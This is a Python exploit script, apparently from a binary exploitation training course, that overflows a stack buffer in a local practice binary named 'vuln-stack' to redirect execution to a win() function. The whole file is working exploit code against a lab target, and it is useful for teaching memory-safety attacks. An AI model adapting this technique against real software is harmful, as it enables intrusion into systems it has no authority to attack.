#!/usr/bin/env python3
# Exploit: Stack Buffer Overflow â€“ vuln-stack (OST2 Style)

import struct
import subprocess
import os

# ---------------------------[ CONFIGURATION ]---------------------------

OFFSET = 76  # Use pattern_offset to find this
WIN_ADDR = 0x080491e6  # Replace with the actual address of win()

# -----------------------------------------------------------------------

def build_payload(offset: int, win_addr: int) -> bytes:
    """Constructs exploit payload with padding + return address."""
    padding = b"A" * offset
    ret = struct.pack("<I", win_addr)
    return padding + ret

def run_exploit(binary_path: str, payload: bytes):
    """Runs the vulnerable binary with crafted payload."""
    print(f"[+] Running {binary_path} with crafted payload...")
    try:
        subprocess.run([binary_path, payload.decode('latin-1')])
    except subprocess.CalledProcessError:
        print("[-] Process crashed (expected if overflow works)")
    except Exception as e:
        print(f"[!] Unexpected error: {e}")

def main():
    print("ðŸš€ Stack Overflow Exploit â€“ vuln-stack")
    print(f"[*] Offset: {OFFSET} bytes")
    print(f"[*] Target RET address (win): {hex(WIN_ADDR)}")

    payload = build_payload(OFFSET, WIN_ADDR)

    print(f"[>] Payload length: {len(payload)} bytes")
    print(f"[>] Payload (hex): {payload.hex()}")

    with open("payload.bin", "wb") as f:
        f.write(payload)
        print("[+] Payload written to payload.bin")

    run_exploit("./vuln-stack", payload)

if __name__ == "__main__":
    if not os.path.exists("./vuln-stack"):
        exit(1)
    main()
